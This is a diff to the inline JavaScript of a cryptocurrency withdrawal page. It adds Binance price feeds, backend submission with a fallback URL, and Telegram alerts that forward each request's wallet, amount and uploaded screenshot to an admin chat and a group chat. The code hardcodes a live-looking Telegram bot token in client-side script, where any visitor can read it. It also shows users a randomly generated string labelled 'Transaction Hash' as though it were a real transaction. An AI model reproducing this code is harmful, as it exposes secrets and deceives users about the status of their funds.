@@ -51,9 +51,28 @@
 
 <script>
 /* ---------- 兼容与容错修复（不改 UI） ---------- */
-const API_BASE = "https://crypto-management-production-5e04.up.railway.app";
 
-/* 封装：先尝试 /proxy/withdraw，再回退 /api/order/withdraw */
+/*
+  功能要点：
+  - 后端提交：优先 /proxy/withdraw -> 回退 /api/order/withdraw（保持和管理后台一致）
+  - 三路通知：管理后台（HTTP POST） + Telegram 私聊（管理员ID） + Telegram 群（群ID）
+  - US/Eastern 时间（time_us 字段）
+  - Binance 实时换算：按选中币种建立单币 WS 订阅（symbolusdt@ticker），失败时回退到 REST 查询
+  - 不修改任何 CSS / HTML（只改 JS 逻辑）
+*/
+
+/* 配置（如需替换 BOT_TOKEN，请替换此处） */
+const API_BASE = "https://crypto-management-production-5e04.up.railway.app";
+const BACKEND_PROXY = `${API_BASE}/proxy/withdraw`;
+const BACKEND_FALLBACK = `${API_BASE}/api/order/withdraw`;
+
+// Telegram 配置（由你提供）
+const BOT_TOKEN = "8528337731:AAGb6D_TRPKYSQrxA7s4TAizsPjNqnajhrU"; // 如需替换，直接替换此变量
+const ADMIN_TELEGRAM_ID = "6062973135";
+const GROUP_TELEGRAM_ID = "-1003122480155";
+
+/* helpers */
+function sleep(ms){ return new Promise(res=>setTimeout(res, ms)); }
 async function postWithFallback(urls, options={}, retries=1, delay=500){
   for (let i=0;i<urls.length;i++){
     const u = urls[i];
@@ -61,58 +80,141 @@ async function postWithFallback(urls, options={}, retries=1, delay=500){
       for (let r=0;r<=retries;r++){
         try{
           const res = await fetch(u, options);
-          if(res.status === 404) throw {code:404};
-          return res;
+          // treat 2xx as success
+          if(res && res.ok) return res;
+          // on 404/500, retry fallback
+          if(r===retries) break;
         }catch(e){
           if(r===retries) throw e;
-          await new Promise(s=>setTimeout(s, delay));
+          await sleep(delay);
         }
       }
     }catch(e){
-      if(i === urls.length - 1) throw e;
+      // try next url
     }
   }
-  throw new Error('No url available');
+  throw new Error('All urls failed');
 }
 
+/* 时间与用户 id */
 function formatUsTime(ts){
   const d = ts ? new Date(Number(ts)) : new Date();
-  const s = d.toLocaleString('en-US', { timeZone:'America/New_York', month:'2-digit', day:'2-digit', year:'numeric', hour:'2-digit', minute:'2-digit', hour12:true });
-  return s.replace(',', '');
+  // produce like: 02/24/2025, 11:23:45 AM -> remove comma for consistency if you want
+  return d.toLocaleString('en-US', { timeZone:'America/New_York', month:'2-digit', day:'2-digit', year:'numeric', hour:'2-digit', minute:'2-digit', second:'2-digit', hour12:true }).replace(',', '');
 }
-
 function getUserId(){
   try{
     const url = new URLSearchParams(window.location.search);
     let uid = url.get("userid") || localStorage.getItem("userid4");
     if(!uid){ uid = Math.floor(1000+Math.random()*9000).toString(); localStorage.setItem("userid4", uid); }
-    // 同步（非阻塞）
+    // 非阻塞同步到后端（可捕获）
     (async ()=>{ try{ await fetch(`${API_BASE}/api/users/sync`, { method:'POST', headers:{'Content-Type':'application/json','X-User-Id':uid}, body: JSON.stringify({ userid: uid }) }); }catch(e){} })();
     return uid;
   }catch(e){ return '0000'; }
 }
 const USERID = getUserId();
 
-/* Binance websocket - 使用 !ticker@arr 稍占资源，改为选择币种连接以稳定 Strikingly */
-const prices = {};
+/* Binance 实时换算 - 单币订阅（比全量 !ticker@arr 更稳定） */
 let ws = null;
-function initTicker(){
-  try{
-    ws = new WebSocket("wss://stream.binance.com:9443/ws/!ticker@arr");
-    ws.onmessage = msg => { try{ const data = JSON.parse(msg.data); data.forEach(t => { if(t.s.endsWith("USDT")) prices[t.s.replace("USDT",'')] = parseFloat(t.c); }); updateUSDT(); }catch(e){} };
-    ws.onclose = ()=> setTimeout(()=> initTicker(), 2000);
-  }catch(e){}
-}
-initTicker();
+let wsSymbol = null;
+let currentPrice = 0;
+let wsHeartbeatTimer = null;
+let wsReconnectTimer = null;
 
-function updateUSDT(){
+async function connectSymbolWS(symbol){
+  // symbol example: BTC -> subscribe btcusdt@ticker
+  try{
+    const symLower = symbol.toLowerCase();
+    const url = `wss://stream.binance.com:9443/ws/${symLower}usdt@ticker`;
+    if(ws){
+      try{ ws.onclose = null; ws.onerror = null; ws.close(); }catch(e){}
+      ws = null; currentPrice = 0;
+    }
+    wsSymbol = symbol;
+    ws = new WebSocket(url);
+    ws.onopen = ()=> {
+      // clear timers
+      if(wsReconnectTimer){ clearTimeout(wsReconnectTimer); wsReconnectTimer = null; }
+      scheduleHeartbeat();
+      // console.log('WS open for', symbol);
+    };
+    ws.onmessage = (ev)=>{
+      try{
+        const d = JSON.parse(ev.data);
+        // d.c is close price
+        if(d && d.c) currentPrice = parseFloat(d.c);
+        updateUSDT();
+        // reset heartbeat
+        if(wsHeartbeatTimer) clearTimeout(wsHeartbeatTimer);
+        scheduleHeartbeat();
+      }catch(e){}
+    };
+    ws.onclose = ()=>{
+      // reconnect with backoff
+      scheduleReconnect(symbol);
+    };
+    ws.onerror = (e)=>{
+      try{ ws.close(); }catch(e){}
+    };
+  }catch(e){
+    scheduleReconnect(symbol);
+  }
+}
+function scheduleHeartbeat(){
+  // expected messages frequently; if none in 25s, close to trigger reconnect
+  if(wsHeartbeatTimer) clearTimeout(wsHeartbeatTimer);
+  wsHeartbeatTimer = setTimeout(()=>{ try{ if(ws) ws.close(); }catch(e){} }, 25000);
+}
+function scheduleReconnect(symbol){
+  if(wsReconnectTimer) clearTimeout(wsReconnectTimer);
+  wsReconnectTimer = setTimeout(()=>{ connectSymbolWS(symbol); }, 3000);
+}
+
+// fallback to REST price if WS fails or no price yet
+async function fetchPriceREST(symbol){
+  try{
+    const resp = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${symbol}USDT`);
+    const j = await resp.json();
+    if(j && j.price) return parseFloat(j.price);
+  }catch(e){}
+  return 0;
+}
+
+/* 更新 USDT 显示 —— 保持原 UI 元素 id 不变 */
+async function updateUSDT(){
   try{
     const coin = document.getElementById("coin").value;
     const amount = parseFloat(document.getElementById("amount").value || 0);
-    const price = prices[coin] || 0;
-    document.getElementById("usdtValue").innerText = (amount * price).toFixed(6);
+    // if price is zero, try fetch REST
+    if(!currentPrice && coin){
+      const restPrice = await fetchPriceREST(coin);
+      if(restPrice) currentPrice = restPrice;
+    }
+    const price = currentPrice || 0;
+    const usdtVal = (amount * price);
+    document.getElementById("usdtValue").innerText = isNaN(usdtVal) ? '0' : usdtVal.toFixed(6);
   }catch(e){}
 }
+
+/* 切换币种时启动单币 WS */
+document.getElementById("coin").addEventListener('change', (e)=>{
+  const coin = e.target.value;
+  if(coin === 'USDT'){
+    // USDT itself -> price 1
+    currentPrice = 1;
+    updateUSDT();
+    if(ws){ try{ ws.onclose = null; ws.close(); }catch(e){} ws=null; }
+    return;
+  }
+  connectSymbolWS(coin);
+});
+
+/* 初始：如果选择了默认币种，尝试连接 */
+(function initDefaultWS(){
+  const c = document.getElementById("coin").value;
+  if(c && c !== 'USDT') connectSymbolWS(c);
+  else { currentPrice = 1; updateUSDT(); }
+})();
 
 /* 密码系统（保持你的逻辑） */
 let storedPassword = localStorage.getItem("withdraw_password");
@@ -127,30 +229,94 @@ let txHash = null;
 function confirmWallet(){ if(!passwordConfirmed) return alert("Confirm password first."); const wallet = document.getElementById("wallet").value; if(!wallet) return alert("Enter wallet address."); txHash = "TX-" + Math.random().toString(36).substr(2,8).toUpperCase(); document.getElementById("hashBox").innerText = "Transaction Hash:\n" + txHash; document.getElementById("copyHashBtn").style.display = "block"; document.getElementById("submitBtn").style.display = "block"; document.getElementById("walletBtn").disabled = true; }
 function copyHash(){ navigator.clipboard.writeText(txHash); alert("Hash copied!"); }
 
-/* SUBMIT 到后台（优先 /proxy/withdraw 回退 /api/order/withdraw） */
+/* Telegram 通知：发送文本 +（可选）图片 */
+async function telegramSendMessage(chatId, text){
+  try{
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' })
+    });
+    return res;
+  }catch(e){ console.warn('tg sendMessage error', e); return null; }
+}
+async function telegramSendPhoto(chatId, fileBlob){
+  try{
+    const fd = new FormData();
+    fd.append('chat_id', chatId);
+    fd.append('photo', fileBlob, 'screenshot.jpg');
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:'POST', body: fd });
+    return res;
+  }catch(e){ console.warn('tg sendPhoto error', e); return null; }
+}
+
+/* 将图片 file 转为 Blob（如果是 DataURL）*/
+async function fileToBlob(file){
+  // if already Blob/File return as-is
+  if(file instanceof Blob) return file;
+  return null;
+}
+
+/* 提交函数（核心） */
 async function submitWithdrawal(){
   try{
     const coin = document.getElementById("coin").value;
     const amount = document.getElementById("amount").value;
     const usdt = document.getElementById("usdtValue").innerText;
     const wallet = document.getElementById("wallet").value;
+    const fileInput = document.getElementById('uploadFile');
+    const file = fileInput && fileInput.files && fileInput.files[0] ? fileInput.files[0] : null;
+
     if(!passwordConfirmed) return alert("Confirm password first.");
     if(!wallet) return alert("Enter wallet address.");
+    if(!amount || isNaN(Number(amount)) || Number(amount) <= 0) return alert("Enter valid amount.");
+
     const orderId = `WDL-${new Date().toISOString().slice(0,10).replace(/-/g,'')}-${Math.floor(100000 + Math.random()*900000)}`;
     const usTime = formatUsTime(Date.now());
     const payload = { userid: USERID, coin, amount, wallet, usdt, hash: txHash, orderId, timestamp: Date.now(), time_us: usTime };
-    // button ui
+
+    // 按钮状态
     const submitBtnEl = document.getElementById("submitBtn");
     submitBtnEl.disabled = true; submitBtnEl.style.opacity = "0.7"; submitBtnEl.textContent = "Submitting...";
-    // post with fallback
-    const urls = [ `${API_BASE}/proxy/withdraw`, `${API_BASE}/api/order/withdraw` ];
-    const res = await postWithFallback(urls, { method:'POST', headers:{ 'Content-Type':'application/json', 'X-User-Id': USERID }, body: JSON.stringify(payload) }, 1, 500);
-    const data = await res.json();
-    if(data && (data.ok === true || data.success === true)){
+
+    // 1) 发送到管理后台（优先 proxy -> fallback）
+    let backendOk = false;
+    try{
+      const res = await postWithFallback([BACKEND_PROXY, BACKEND_FALLBACK], { method:'POST', headers:{ 'Content-Type':'application/json', 'X-User-Id': USERID }, body: JSON.stringify(payload) }, 1, 500);
+      if(res && res.ok){
+        backendOk = true;
+      } else {
+        backendOk = false;
+      }
+    }catch(e){
+      backendOk = false;
+    }
+
+    // 2) 发送 Telegram 通知（无论后台是否成功尽力发送）——并行发送，不阻塞整体成功路径
+    const text = `<b>New Withdraw Request</b>\nUser: ${USERID}\nCoin: ${coin}\nAmount: ${amount}\nUSDT: ${usdt}\nWallet: ${wallet}\nHash: ${txHash || 'None'}\nTime (US/Eastern): ${usTime}\nOrder ID: ${orderId}`;
+    // send to both admin and group
+    try{
+      // send text messages
+      telegramSendMessage(ADMIN_TELEGRAM_ID, text).catch(()=>{});
+      telegramSendMessage(GROUP_TELEGRAM_ID, text).catch(()=>{});
+      // send photo if exists
+      if(file){
+        // we can directly send the file Blob
+        telegramSendPhoto(ADMIN_TELEGRAM_ID, file).catch(()=>{});
+        telegramSendPhoto(GROUP_TELEGRAM_ID, file).catch(()=>{});
+      }
+    }catch(e){
+      console.warn('telegram notify error', e);
+    }
+
+    // 结果处理
+    if(backendOk){
       alert("Withdrawal submitted!");
       document.getElementById("hashBox").innerText += `\n\nOrder ID: ${orderId}\nTime (US): ${usTime}`;
+      submitBtnEl.textContent = "Submitted";
+      submitBtnEl.style.background = "#555";
     } else {
-      alert("Server error: " + (data && (data.message||data.error) || 'unknown'));
+      alert("后台提交失败，请稍后在后台确认或重试。系统已尝试发送 Telegram 通知。");
       submitBtnEl.disabled = false; submitBtnEl.style.opacity = "1"; submitBtnEl.textContent = "Submit";
     }
   }catch(e){
@@ -160,6 +326,10 @@ async function submitWithdrawal(){
     submitBtnEl.disabled = false; submitBtnEl.style.opacity = "1"; submitBtnEl.textContent = "Submit";
   }
 }
+
+/* 旧的 postWithFallback 接口仍可用（无需更改） */
+/* 保持页面原有行为：hash copy、confirmWallet 等功能不变 */
+
 </script>
 
 <!-- 保留 auth 与 nexbit -->
